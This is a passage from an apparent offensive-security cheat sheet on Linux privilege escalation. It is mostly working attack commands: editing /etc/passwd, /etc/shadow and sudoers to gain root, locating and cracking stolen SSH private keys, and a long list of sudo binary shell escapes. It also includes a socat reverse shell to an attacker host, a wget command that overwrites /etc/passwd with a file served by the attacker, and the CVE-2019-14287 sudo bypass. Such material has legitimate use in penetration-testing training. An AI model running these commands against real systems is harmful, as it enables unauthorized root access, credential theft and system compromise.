<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=n>OR</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a>  <span class=n>vi</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a>  <span class=n>Remote</span> <span class=n>X</span> <span class=p>(</span><span class=n>Password</span> <span class=n>Holder</span><span class=p>)</span> <span class=k>for</span> <span class=n>root</span>
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a>  <span class=n>wg</span><span class=p>!</span>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a>  <span class=n>su</span> <span class=n>root</span>
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>  <span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a>
<a id=__codelineno-4-15 name=__codelineno-4-15 href=#__codelineno-4-15></a><span class=p>//</span> <span class=n>Remove</span> <span class=n>root</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>password</span>  
<a id=__codelineno-4-16 name=__codelineno-4-16 href=#__codelineno-4-16></a>
<a id=__codelineno-4-17 name=__codelineno-4-17 href=#__codelineno-4-17></a><span class=n>OR</span>
<a id=__codelineno-4-18 name=__codelineno-4-18 href=#__codelineno-4-18></a>
<a id=__codelineno-4-19 name=__codelineno-4-19 href=#__codelineno-4-19></a>  <span class=nb>echo </span><span class=n>root</span><span class=p>::</span><span class=n>0</span><span class=p>:</span><span class=n>0</span><span class=p>:</span><span class=n>root</span><span class=p>:/</span><span class=n>root</span><span class=p>:/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-4-20 name=__codelineno-4-20 href=#__codelineno-4-20></a>  <span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whomai</span>
<a id=__codelineno-4-21 name=__codelineno-4-21 href=#__codelineno-4-21></a>
<a id=__codelineno-4-22 name=__codelineno-4-22 href=#__codelineno-4-22></a><span class=n>OR</span>
<a id=__codelineno-4-23 name=__codelineno-4-23 href=#__codelineno-4-23></a>
<a id=__codelineno-4-24 name=__codelineno-4-24 href=#__codelineno-4-24></a><span class=n>openssl</span> <span class=n>passwd</span> <span class=p>-</span><span class=n>1</span> <span class=n>-salt</span> <span class=n>ignite</span> <span class=n>NewRootPassword</span>
<a id=__codelineno-4-25 name=__codelineno-4-25 href=#__codelineno-4-25></a><span class=nb>Copy </span><span class=n>output</span>
<a id=__codelineno-4-26 name=__codelineno-4-26 href=#__codelineno-4-26></a><span class=nb>echo </span><span class=s2>&quot;root2:&lt;output&gt;:0:0:root:/root:/bin/bash&quot;</span> <span class=p>&gt;&gt;</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-4-27 name=__codelineno-4-27 href=#__codelineno-4-27></a><span class=n>Replace</span> <span class=p>&lt;</span><span class=n>output</span><span class=p>&gt;</span> <span class=n>with</span> <span class=n>the</span> <span class=n>copied</span> <span class=n>output</span>
<a id=__codelineno-4-28 name=__codelineno-4-28 href=#__codelineno-4-28></a><span class=n>su</span> <span class=n>root2</span>
<a id=__codelineno-4-29 name=__codelineno-4-29 href=#__codelineno-4-29></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> With /etc/shadow <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>   <span class=n>Run</span> <span class=n>python</span> <span class=n>-c</span> <span class=s2>&quot;import crypt; print crypt.crypt(&#39;NewRootPassword&#39;)&quot;</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>   <span class=nb>Copy </span><span class=n>the</span> <span class=n>output</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>   <span class=n>vi</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>shadow</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>   <span class=n>Replace</span> <span class=n>root</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>hash</span> <span class=n>with</span> <span class=n>the</span> <span class=n>output</span> <span class=n>that</span> <span class=n>you</span> <span class=n>generated</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>   <span class=n>wq</span><span class=p>!</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>   <span class=n>su</span> <span class=n>root</span> 
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a>   <span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> With /etc/sudoers <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a>   <span class=nb>echo </span><span class=s2>&quot;&lt;username&gt; ALL=(ALL:ALL) ALL&quot;</span> <span class=p>&gt;&gt;</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>sudoers</span> <span class=p>//</span> <span class=n>Replace</span> <span class=s2>&quot;Username&quot;</span> <span class=n>with</span> <span class=n>your</span> <span class=n>current</span> <span class=n>user</span> <span class=p>(</span><span class=n>Example</span><span class=p>:</span> <span class=n>www-data</span><span class=p>)</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>   <span class=n>sudo</span> <span class=n>su</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>   <span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a>   <span class=p>```</span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=c># SSH Private Keys </span>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a>
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a>
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a>
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a><span class=p>```</span><span class=n>ps1</span>
<a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a><span class=n>find</span> <span class=p>/</span> <span class=n>-name</span> <span class=n>authorized_keys</span> <span class=n>2</span><span class=p>&gt;</span> <span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>              <span class=p>//</span> <span class=n>Any</span> <span class=n>Public</span> <span class=n>Keys</span><span class=p>?</span>
<a id=__codelineno-6-12 name=__codelineno-6-12 href=#__codelineno-6-12></a><span class=n>find</span> <span class=p>/</span> <span class=n>-name</span> <span class=n>id_rsa</span> <span class=n>2</span><span class=p>&gt;</span> <span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>                       <span class=p>//</span> <span class=n>Any</span> <span class=n>SSH</span> <span class=n>private</span> <span class=n>keys</span><span class=p>?</span> 
<a id=__codelineno-6-13 name=__codelineno-6-13 href=#__codelineno-6-13></a>
<a id=__codelineno-6-14 name=__codelineno-6-14 href=#__codelineno-6-14></a>   <span class=nb>Copy </span><span class=n>id_rsa</span> <span class=n>contents</span> <span class=n>of</span> <span class=n>keys</span> <span class=n>found</span> <span class=n>with</span> <span class=n>the</span> <span class=n>above</span> <span class=n>command</span>
<a id=__codelineno-6-15 name=__codelineno-6-15 href=#__codelineno-6-15></a>   <span class=n>Create</span> <span class=n>a</span> <span class=n>local</span> <span class=n>file</span> <span class=n>on</span> <span class=n>your</span> <span class=n>box</span> <span class=n>and</span> <span class=n>paste</span> <span class=n>the</span> <span class=n>content</span> <span class=k>in</span>
<a id=__codelineno-6-16 name=__codelineno-6-16 href=#__codelineno-6-16></a>   <span class=n>chmod</span> <span class=n>600</span> <span class=p>&lt;</span><span class=n>local_file</span><span class=p>&gt;</span>
<a id=__codelineno-6-17 name=__codelineno-6-17 href=#__codelineno-6-17></a>   <span class=n>ssh</span> <span class=n>-i</span> <span class=p>&lt;</span><span class=n>local_file</span><span class=p>&gt;</span> <span class=n>user</span><span class=nv>@IP</span>
<a id=__codelineno-6-18 name=__codelineno-6-18 href=#__codelineno-6-18></a>
<a id=__codelineno-6-19 name=__codelineno-6-19 href=#__codelineno-6-19></a>   <span class=p>//</span> <span class=n>Is</span> <span class=n>the</span> <span class=n>key</span> <span class=n>password</span> <span class=n>protected</span><span class=p>?</span>
<a id=__codelineno-6-20 name=__codelineno-6-20 href=#__codelineno-6-20></a>
<a id=__codelineno-6-21 name=__codelineno-6-21 href=#__codelineno-6-21></a>   <span class=n>ssh2john</span> <span class=p>&lt;</span><span class=n>local_file</span><span class=p>&gt;</span> <span class=p>&gt;</span> <span class=n>hash</span>
<a id=__codelineno-6-22 name=__codelineno-6-22 href=#__codelineno-6-22></a>   <span class=n>john</span> <span class=n>hash</span> <span class=p>-</span><span class=n>-wordlist</span><span class=p>=/</span><span class=n>usr</span><span class=p>/</span><span class=n>share</span><span class=p>/</span><span class=n>wordlists</span><span class=p>/</span><span class=n>rockyou</span><span class=p>.</span><span class=n>txt</span>
</code></pre></div></p> <h2 id=kernel-expliots><strong>Kernel Expliots</strong><a class=headerlink href=#kernel-expliots title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=n>uname</span> <span class=n>-a</span> <span class=p>//</span> <span class=n>What</span> <span class=n>OS</span> <span class=n>kernel</span> <span class=n>are</span> <span class=n>we</span> <span class=n>using</span><span class=p>?</span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=p>//</span> <span class=n>Google</span> <span class=n>Search</span> <span class=p>(</span><span class=n>Example</span><span class=p>):</span> <span class=n>4</span><span class=p>.</span><span class=n>4</span><span class=p>.</span><span class=n>0</span><span class=p>-</span><span class=n>116-generic</span> <span class=c>#140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github</span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=p>//</span> <span class=n>Read</span> <span class=n>the</span> <span class=n>expliots</span> <span class=n>and</span> <span class=n>follow</span> <span class=n>the</span> <span class=n>instructions</span>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=p>//</span> <span class=n>Popular</span> <span class=n>Linux</span> <span class=n>Kernel</span> <span class=n>Exploits</span>
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a><span class=n>Dirty</span> <span class=n>COW</span> <span class=p>(</span><span class=n>CVE</span><span class=p>-</span><span class=n>2016</span><span class=p>-</span><span class=n>5195</span><span class=p>)</span>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=n>URL</span><span class=p>:</span> <span class=n>https</span><span class=p>://</span><span class=n>dirtycow</span><span class=p>.</span><span class=n>ninja</span><span class=p>/</span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a>
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a><span class=n>Other</span> <span class=n>Kernel</span> <span class=n>Expliots</span>
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a><span class=n>URL</span><span class=p>:</span> <span class=n>https</span><span class=p>://</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>SecWiki</span><span class=p>/</span><span class=n>linux-kernel-exploits</span>
</code></pre></div> <h2 id=sudo-l><strong>Sudo -l</strong><a class=headerlink href=#sudo-l title="Permanent link">&para;</a></h2> <p>Sudo -l </p> <p>What binaries can we execute with Sudo?</p> <p>Example Output</p> <p>User www-data may run the following commands on <hostname></p> <ul> <li>(root) NOPASSWD: /usr/bin/find</li> <li>(root) NOPASSWD: /usr/bin/nmap</li> <li>(root) NOPASSWD: /usr/bin/env</li> <li>(root) NOPASSWD: /usr/bin/vim</li> <li>(root) NOPASSWD: /usr/bin/awk</li> <li>(root) NOPASSWD: /usr/bin/perl</li> <li>(root) NOPASSWD: /usr/bin/python</li> <li>(root) NOPASSWD: /usr/bin/less</li> <li>(root) NOPASSWD: /usr/bin/man</li> <li>(root) NOPASSWD: /usr/bin/ftp</li> <li>(root) NOPASSWD: /usr/bin/socat</li> <li>(root) NOPASSWD: /usr/bin/zip</li> <li>(root) NOPASSWD: /usr/bin/gcc</li> <li>(root) NOPASSWD: /usr/bin/docker</li> <li>(root) NOPASSWD: /usr/bin/env</li> <li>(root) NOPASSWD: /usr/bin/MySQL</li> <li>(root) NOPASSWD: /usr/bin/ssh</li> <li>(root) NOPASSWD: /usr/bin/tmux</li> <li>(root) NOPASSWD: /usr/bin/pkexec</li> <li>(root) NOPASSWD: /usr/bin/rlwrap</li> <li>(root) NOPASSWD: /usr/bin/xargs</li> <li>(root) NOPASSWD: /usr/bin/anansi_util</li> <li>(root) NOPASSWD: /usr/bin/apt-get</li> <li>(root) NOPASSWD: /usr/bin/flask run</li> <li>(root) NOPASSWD: /usr/bin/apache2</li> <li>(root) NOPASSWD: /usr/bin/wget</li> </ul> <h3 id=absuing-sudo-binaries-to-gain-root><strong>Absuing Sudo binaries to gain root</strong><a class=headerlink href=#absuing-sudo-binaries-to-gain-root title="Permanent link">&para;</a></h3> <hr> <p>find <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=n>sudo</span> <span class=n>find</span> <span class=p>/</span> <span class=n>etc</span><span class=p>/</span><span class=n>passwd</span> <span class=n>-exec</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=p>\;</span>
</code></pre></div></p> <p>Nmap <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=nb>echo </span><span class=s2>&quot;os.execute(&#39;/bin/bash/&#39;)&quot;</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>shell</span><span class=p>.</span><span class=n>nse</span> <span class=p>&amp;&amp;</span> <span class=n>sudo</span> <span class=n>nmap</span> <span class=p>-</span><span class=n>-script</span><span class=p>=/</span><span class=n>tmp</span><span class=p>/</span><span class=n>shell</span><span class=p>.</span><span class=n>nse</span>
</code></pre></div></p> <p>Env <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=n>sudo</span> <span class=n>env</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
</code></pre></div></p> <p>Vim <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=n>sudo</span> <span class=n>vim</span> <span class=n>-c</span> <span class=s1>&#39;:!/bin/bash&#39;</span>
</code></pre></div></p> <p>Awk <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=n>sudo</span> <span class=n>awk</span> <span class=s1>&#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</span>
</code></pre></div></p> <p>Perl <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=n>sudo</span> <span class=n>perl</span> <span class=n>-e</span> <span class=s1>&#39;exec &quot;/bin/bash&quot;;&#39;</span>
</code></pre></div></p> <p>Python <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=n>sudo</span> <span class=n>python</span> <span class=n>-c</span> <span class=s1>&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</code></pre></div></p> <p>Less <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=n>sudo</span> <span class=n>less</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>hosts</span> <span class=p>-</span> <span class=p>!</span><span class=n>bash</span>
</code></pre></div></p> <p>Man <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=n>sudo</span> <span class=nb>man man </span><span class=p>-</span> <span class=p>!</span><span class=n>bash</span>
</code></pre></div></p> <p>ftp <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=n>sudo</span> <span class=n>ftp</span> <span class=p>-</span> <span class=p>!</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
</code></pre></div></p> <p>socat <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=n>Attacker</span> <span class=p>=</span> <span class=n>socat</span> <span class=n>file</span><span class=p>:`</span><span class=n>tty</span><span class=p>`,</span><span class=n>raw</span><span class=p>,</span><span class=n>echo</span><span class=p>=</span><span class=n>0</span> <span class=n>tcp-listen</span><span class=p>:</span><span class=n>1234</span>
<a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a><span class=n>Victim</span> <span class=p>=</span> <span class=n>sudo</span> <span class=n>socat</span> <span class=n>exec</span><span class=p>:</span><span class=s1>&#39;sh -li&#39;</span><span class=p>,</span><span class=n>pty</span><span class=p>,</span><span class=n>stderr</span><span class=p>,</span><span class=n>setsid</span><span class=p>,</span><span class=n>sigint</span><span class=p>,</span><span class=n>sane</span> <span class=n>tcp</span><span class=p>:</span><span class=n>192</span><span class=p>.</span><span class=n>168</span><span class=p>.</span><span class=n>1</span><span class=p>.</span><span class=n>105</span><span class=p>:</span><span class=n>1234</span>
</code></pre></div></p> <p>Zip <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=nb>echo </span><span class=n>test</span> <span class=p>&gt;</span> <span class=n>notes</span><span class=p>.</span><span class=n>txt</span>
<a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a><span class=n>sudo</span> <span class=n>zip</span> <span class=n>test</span><span class=p>.</span><span class=n>zip</span> <span class=n>notes</span><span class=p>.</span><span class=n>txt</span> <span class=n>-T</span> <span class=p>-</span><span class=n>-unzip-command</span><span class=p>=</span><span class=s2>&quot;sh -c /bin/bash&quot;</span>
</code></pre></div></p> <p>gcc <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=n>sudo</span> <span class=n>gcc</span> <span class=n>-wrapper</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span><span class=p>,</span><span class=n>-s</span> <span class=p>.</span>
</code></pre></div></p> <p>Docker <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=n>sudo</span> <span class=n>docker</span> <span class=n>run</span> <span class=n>-v</span> <span class=p>/:/</span><span class=n>mnt</span> <span class=p>-</span><span class=n>-rm</span> <span class=n>-it</span> <span class=n>alpine</span> <span class=n>chroot</span> <span class=p>/</span><span class=n>mnt</span> <span class=n>sh</span>
</code></pre></div></p> <p>MySQL <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=n>sudo</span> <span class=n>mysql</span> <span class=n>-e</span> <span class=s1>&#39;\! /bin/sh&#39;</span>
</code></pre></div></p> <p>SSH <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=n>sudo</span> <span class=n>ssh</span> <span class=n>-o</span> <span class=n>ProxyCommand</span><span class=p>=</span><span class=s1>&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;</span> <span class=n>x</span>
</code></pre></div></p> <p>Tmux <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=n>Sudo</span> <span class=n>tmux</span>
</code></pre></div></p> <p>pkexec <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=n>sudo</span> <span class=n>pkexec</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
</code></pre></div></p> <p>rlwrap <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=n>sudo</span> <span class=n>rlwrap</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
</code></pre></div></p> <p>xargs <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a><span class=n>sudo</span> <span class=n>xargs</span> <span class=n>-a</span> <span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=n>sh</span>
</code></pre></div></p> <p>anansi_util <div class=highlight><pre><span></span><code><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=n>sudo</span> <span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>anansi</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>anansi_util</span> <span class=n>manual</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>  
</code></pre></div></p> <p>apt-get <div class=highlight><pre><span></span><code><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a><span class=n>sudo</span> <span class=n>apt-get</span> <span class=n>update</span> <span class=n>-o</span> <span class=n>APT</span><span class=p>::</span><span class=n>Update</span><span class=p>::</span><span class=n>Pre-Invoke</span><span class=p>::=</span><span class=err>”</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-i</span><span class=err>”</span>
</code></pre></div></p> <p>flask run <div class=highlight><pre><span></span><code><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a><span class=nb>echo </span><span class=s1>&#39;import pty; pty.spawn(“/bin/bash”)&#39;</span> <span class=p>&gt;</span> <span class=n>flask</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-30-2 name=__codelineno-30-2 href=#__codelineno-30-2></a><span class=n>export</span> <span class=n>FLASK_APP</span><span class=p>=</span><span class=n>flask</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-30-3 name=__codelineno-30-3 href=#__codelineno-30-3></a><span class=n>sudo</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>flask</span> <span class=n>run</span>
</code></pre></div></p> <p>apache2</p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-31-1 name=__codelineno-31-1 href=#__codelineno-31-1></a><span class=n>sudo</span> <span class=n>apache2</span> <span class=o>-f</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>shadow</span>
<a id=__codelineno-31-2 name=__codelineno-31-2 href=#__codelineno-31-2></a><span class=nb>Copy </span><span class=n>root</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>hash</span>
</code></pre></div> Attacker <div class=highlight><pre><span></span><code><a id=__codelineno-32-1 name=__codelineno-32-1 href=#__codelineno-32-1></a><span class=nb>echo </span><span class=s1>&#39;&lt;root&#39;</span><span class=n>s_hash</span><span class=p>&gt;</span><span class=s1>&#39; &gt; hash</span>
<a id=__codelineno-32-2 name=__codelineno-32-2 href=#__codelineno-32-2></a><span class=s1>john hash --wordlist=/usr/share/wordlists/rockyou.txt</span>
<a id=__codelineno-32-3 name=__codelineno-32-3 href=#__codelineno-32-3></a>
<a id=__codelineno-32-4 name=__codelineno-32-4 href=#__codelineno-32-4></a><span class=s1>// Replace &lt;root&#39;</span><span class=n>s_hash</span><span class=p>&gt;</span> <span class=n>with</span> <span class=n>the</span> <span class=n>hash</span> <span class=n>that</span> <span class=n>you</span> <span class=n>copied</span> 
</code></pre></div> Back to Victim <div class=highlight><pre><span></span><code><a id=__codelineno-33-1 name=__codelineno-33-1 href=#__codelineno-33-1></a><span class=n>su</span> <span class=n>root</span>
<a id=__codelineno-33-2 name=__codelineno-33-2 href=#__codelineno-33-2></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> Wget</p> <p>Victim <div class=highlight><pre><span></span><code><a id=__codelineno-34-1 name=__codelineno-34-1 href=#__codelineno-34-1></a><span class=nb>cp </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-34-2 name=__codelineno-34-2 href=#__codelineno-34-2></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
</code></pre></div> Attacker</p> <div class=highlight><pre><span></span><code><a id=__codelineno-35-1 name=__codelineno-35-1 href=#__codelineno-35-1></a><span class=nb>Copy </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span> <span class=n>content</span> <span class=n>and</span> <span class=n>put</span> <span class=k>in</span> <span class=n>a</span> <span class=n>local</span> <span class=n>file</span> <span class=n>called</span> <span class=n>passwd</span>
<a id=__codelineno-35-2 name=__codelineno-35-2 href=#__codelineno-35-2></a><span class=n>Run</span> <span class=n>python</span> <span class=n>-c</span> <span class=s2>&quot;import crypt; print crypt.crypt(&#39;NewRootPassword&#39;)&quot;</span>
<a id=__codelineno-35-3 name=__codelineno-35-3 href=#__codelineno-35-3></a><span class=nb>Copy </span><span class=n>output</span> <span class=n>of</span> <span class=n>the</span> <span class=n>above</span> <span class=n>command</span> 
<a id=__codelineno-35-4 name=__codelineno-35-4 href=#__codelineno-35-4></a><span class=n>edit</span> <span class=n>passwd</span>
<a id=__codelineno-35-5 name=__codelineno-35-5 href=#__codelineno-35-5></a><span class=n>Replace</span> <span class=n>x</span> <span class=k>in</span> <span class=n>root</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>line</span> <span class=n>with</span> <span class=n>the</span> <span class=n>copied</span> <span class=n>output</span>
<a id=__codelineno-35-6 name=__codelineno-35-6 href=#__codelineno-35-6></a><span class=n>Save</span> <span class=n>the</span> <span class=n>file</span>
<a id=__codelineno-35-7 name=__codelineno-35-7 href=#__codelineno-35-7></a><span class=n>python</span> <span class=n>-m</span> <span class=n>SimpleHTTPServer</span> <span class=n>9000</span> <span class=p>//</span> <span class=n>You</span> <span class=n>can</span> <span class=n>use</span> <span class=n>any</span> <span class=n>port</span>
</code></pre></div> <p>Victim</p> <div class=highlight><pre><span></span><code><a id=__codelineno-36-1 name=__codelineno-36-1 href=#__codelineno-36-1></a><span class=n>sudo</span> <span class=nb>wget </span><span class=n>http</span><span class=p>://&lt;</span><span class=n>attacker_ip</span><span class=p>&gt;:</span><span class=n>9000</span><span class=p>/</span><span class=n>passwd</span> <span class=n>-O</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-36-2 name=__codelineno-36-2 href=#__codelineno-36-2></a><span class=n>su</span> <span class=n>root</span> <span class=p>//</span> <span class=n>Enter</span> <span class=n>the</span> <span class=n>new</span> <span class=n>root</span> <span class=n>password</span> <span class=n>you</span> <span class=n>generated</span> <span class=p>(</span><span class=n>Example</span><span class=p>:</span> <span class=n>NewRootPassword</span><span class=p>)</span>
<a id=__codelineno-36-3 name=__codelineno-36-3 href=#__codelineno-36-3></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <h3 id=sudo-cve><strong>Sudo CVE</strong><a class=headerlink href=#sudo-cve title="Permanent link">&para;</a></h3> <p>Ẽploit sudo with known CVE</p> <p>CVE:</p> <ul> <li>CVE-2019-14287</li> <li>CVE-2019-16634</li> </ul> <h4 id=cve-2019-14287><strong>CVE-2019-14287</strong><a class=headerlink href=#cve-2019-14287 title="Permanent link">&para;</a></h4> <p>sudo -V // Get sudo version sudo -l</p> <p>Vulnerable output Output = (ALL,!root) NOPASSWD: /bin/bash </p> <div class=highlight><pre><span></span><code><a id=__codelineno-37-1 name=__codelineno-37-1 href=#__codelineno-37-1></a><span class=n>sudo</span> <span class=n>-u</span><span class=c>#-1 /bin/bash</span>
<a id=__codelineno-37-2 name=__codelineno-37-2 href=#__codelineno-37-2></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
